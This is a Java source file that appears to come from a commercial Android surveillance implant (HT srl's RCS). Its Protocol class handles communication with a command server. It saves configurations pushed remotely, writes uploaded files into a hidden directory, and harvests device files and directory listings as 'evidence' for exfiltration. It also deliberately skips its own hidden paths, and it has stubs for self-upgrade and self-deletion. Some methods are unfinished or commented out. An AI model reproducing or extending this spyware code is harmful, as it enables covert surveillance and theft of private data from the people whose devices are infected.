package com.ht.RCSAndroidGUI.action.sync;

//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;
import java.io.FileOutputStream;
import java.io.BufferedOutputStream;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.EvidenceType;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Directory;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;

import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.DateTime;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

public abstract class Protocol {
	public static final String UPGRADE_FILENAME = "core-update";

	// #ifdef DEBUG
	private static Debug debug = new Debug("Protocol");
	// #endif

	protected Transport transport;

	public boolean reload;
	public boolean uninstall;

	public boolean init(Transport transport) {
		this.transport = transport;
		// transport.initConnection();
		return true;
	}

	public abstract boolean perform() throws ProtocolException;

	public synchronized static boolean saveNewConf(byte[] conf, int offset)
			throws CommandException {
		AutoFile file = new AutoFile(Path.conf()
				+ Configuration.NEW_CONF);

		if (file.write(conf, offset, false)) {
			Evidence.info("New configuration received");
			return true;
		} else {
			return false;
		}

	}

	public static void saveUpload(String filename, byte[] content) {
	      final AutoFile file = new AutoFile(Path.hidden());

	        if (file.exists()) {
	            //#ifdef DEBUG
	            debug.trace("getUpload replacing existing file: " + filename);
	            //#endif
	            file.delete();
	        }
	        file.write(content);

	        //#ifdef DEBUG
	        debug.trace("file written: " + file.exists());
	        //#endif
	}

	public static boolean upgradeMulti(Vector files) {
		//TODO
		return true;
	}

	public static boolean deleteSelf() {
		//TODO
		return false;

	}

	public static void saveDownloadLog(String filefilter) {
		 AutoFile file = new AutoFile(filefilter);
	        if (file.exists()) {
	            //#ifdef DEBUG
	            debug.trace("logging file: " + filefilter);
	            //#endif
	            saveFileLog(file, filefilter);
	        } else {
	            //#ifdef DEBUG
	            debug.trace("not a file, try to expand it: " + filefilter);
	            //#endif
	            
	            String[] files = file.list();
	            for (String filename: files) {
	               
	                file = new AutoFile(filename);
	                if (file.isDirectory()) {
	                    continue;
	                }

	                saveFileLog(file, filename);

	                //#ifdef DEBUG
	                debug.trace("logging file: " + filename);
	                //#endif

	            }
	        }
	}

	private static void saveFileLog(AutoFile file, String filename) {

        //#ifdef DBC
        Check.requires(file != null, "null file");
        Check.requires(file.exists(), "file should exist");
        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
        //#endif

        byte[] content = file.read();
        byte[] additional = Protocol.logDownloadAdditional(filename);
        Evidence log = new Evidence(0);
        log.atomicWriteOnce(additional,EvidenceType.DOWNLOAD,content);

	}

	private static byte[] logDownloadAdditional(String filename) {

	    //#ifdef DBC
        Check.requires(filename != null, "null file");
        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
        //#endif

        String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
        int macroPos = filename.indexOf(path);
        if (macroPos >= 0) {
            //#ifdef DEBUG
            debug.trace("macropos: " + macroPos);
            //#endif
            String start = filename.substring(0, macroPos);
            String end = filename.substring(macroPos + path.length());

            filename = start + Directory.hiddenDirMacro + end;
        }

        //#ifdef DEBUG
        debug.trace("filename: " + filename);
        //#endif

        int version = 2008122901;
        byte[] wfilename = WChar.getBytes(filename);
        byte[] buffer = new byte[wfilename.length + 8];

        final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);
        		

        databuffer.writeInt(version);
        databuffer.writeInt(wfilename.length);
        databuffer.write(wfilename);

        return buffer;
	}

	public static void saveFilesystem(int depth, String path) {
		 Evidence fsLog = new Evidence(0);
	        fsLog.createEvidence(null, EvidenceType.FILESYSTEM);

	        // Expand path and create log
	        if (path.equals("/")) {
	            //#ifdef DEBUG
	            debug.trace("sendFilesystem: root");
	            //#endif
	            expandRoot(fsLog, depth);
	        } else {
	            if (path.startsWith("//") && path.endsWith("/*")) {
	                path = path.substring(1, path.length() - 2);

	                expandPath(fsLog, path, depth);
	            } else {
	                //#ifdef DEBUG
	                debug.error("sendFilesystem: strange path, ignoring it. "
	                        + path);
	                //#endif
	            }
	        }

	        fsLog.close();
	}

	/**
	 * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
	 * 
	 * @param depth
	 */
	private static void expandRoot(Evidence fsLog, int depth) {
		  //#ifdef DBC
        Check.requires(depth > 0, "wrong recursion depth");
        //#endif

        saveRootLog(fsLog); // depth 0
       
        expandPath(fsLog, "/", depth-1);
	}

	private static boolean saveFilesystemLog(Evidence fsLog, String filepath) {
		 //#ifdef DBC
        Check.requires(fsLog != null, "fsLog null");
        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
        //#endif

        //#ifdef DEBUG
        debug.info("save FilesystemLog: " + filepath);
        //#endif
        int version = 2010031501;

        AutoFile file = new AutoFile(filepath);
        if (!file.exists()) {
            //#ifdef DEBUG
            debug.error("non existing file: " + filepath);
            //#endif
            return false;
        }

        byte[] w_filepath = WChar.getBytes(filepath, true);

        byte[] content = new byte[28 + w_filepath.length];
        DataBuffer databuffer = new DataBuffer(content, 0, content.length);

        databuffer.writeInt(version);
        databuffer.writeInt(w_filepath.length);

        int flags = 0;
        long size = file.getSize();

        boolean isDir = file.isDirectory();
        if (isDir) {
            flags |= 1;
        } else {
            if (size == 0) {
                flags |= 2;
            }
        }

        databuffer.writeInt(flags);
        databuffer.writeLong(size);
        databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
        databuffer.write(w_filepath);

        fsLog.writeEvidence(content);

        //#ifdef DEBUG
        debug.trace("expandPath: written log");
        //#endif

        return isDir;

	}

	/**
	 * saves the root log. We use this method because the directory "/" cannot
	 * be opened, we fake it.
	 */
	private static void saveRootLog(Evidence fsLog) {
		int version = 2010031501;

		// #ifdef DBC
		Check.requires(fsLog != null, "fsLog null");
		// #endif
		// byte[] content = new byte[30];
		try {
			ByteArrayOutputStream output = new ByteArrayOutputStream();
			DataOutputStream databuffer = new DataOutputStream(
					new ByteArrayOutputStream());
			databuffer.writeInt(version);
			databuffer.writeInt(2); // len
			databuffer.writeInt(1); // flags
			databuffer.writeLong(0);
			databuffer.writeLong(DateTime.getFiledate(new Date()));
			databuffer.write(WChar.getBytes("/"));
			databuffer.flush();

			fsLog.writeEvidence(output.toByteArray());
		} catch (IOException ex) {
			debug.error(ex);
		}
	}

	/**
	 * Expand recursively the path saving the log. When depth is 0 saves the log
	 * and stop recurring.
	 * 
	 * @param path
	 * @param depth
	 */
	private static void expandPath(Evidence fsLog, String path, int depth) {
		// #ifdef DBC
		Check.requires(depth > 0, "wrong recursion depth");
		Check.requires(path != null, "path==null");
		Check.requires(!path.endsWith("/"), "path shouldn't end with /");
		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
		// #endif

		// #ifdef DEBUG
		debug.trace("expandPath: " + path + " depth: " + depth);
		// #endif

/*		// saveFilesystemLog(path);
		// if (depth > 0) {
		for (Enumeration en = Directory.find(path + "/*"); en.hasMoreElements();) {

			String dPath = path + "/" + (String) en.nextElement();
			if (dPath.endsWith("/")) {
				// #ifdef DEBUG
				debug.trace("expandPath: dir");
				// #endif
				dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
			} else {
				// #ifdef DEBUG
				debug.trace("expandPath: file");
				// #endif
			}

			if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
					|| dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
				// #ifdef DEBUG
				debug.warn("expandPath ignoring hidden path: " + dPath);
				// #endif
				continue;
			}

			boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
			if (isDir && depth > 1) {
				expandPath(fsLog, dPath, depth - 1);
			}
		}
		// }
*/	}

	public static String normalizeFilename(String file) {
		if (file.startsWith("//")) {
			// #ifdef DEBUG
			debug.trace("normalizeFilename: " + file);
			// #endif
			return file.substring(1);
		} else {
			return file;
		}
	}

}
